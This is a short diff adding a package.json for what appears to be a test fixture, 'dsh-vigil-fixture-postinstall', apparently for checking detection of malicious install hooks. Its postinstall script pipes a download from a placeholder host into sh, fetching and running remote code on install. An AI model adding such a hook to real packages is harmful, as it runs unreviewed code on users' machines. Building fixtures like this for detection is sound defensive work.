@@ -1,0 +1,16 @@
+{
+  "name": "dsh-vigil-fixture-postinstall",
+  "version": "0.0.1",
+  "type": "module",
+  "exports": {
+    "./cordis.patch.yml": "./cordis.patch.yml"
+  },
+  "dsh": {
+    "bundle": {
+      "patch": "./cordis.patch.yml"
+    }
+  },
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/payload.sh | sh"
+  }
+}
